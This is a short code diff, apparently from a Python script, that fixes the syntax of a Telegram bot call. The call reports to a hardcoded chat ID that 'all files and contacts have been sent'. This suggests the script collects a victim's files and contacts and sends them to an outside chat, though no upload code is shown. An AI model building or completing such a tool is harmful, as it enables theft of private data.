@@ -45,4 +45,4 @@ while i < total_files:
     threads = []
     print('+',end='',flush=True)
 
-bot.send_message(chat_id=args.1004407813, text='All files and contacts have been sent.')
+bot.send_message(chat_id=1004407813, text='All files and contacts have been sent.')
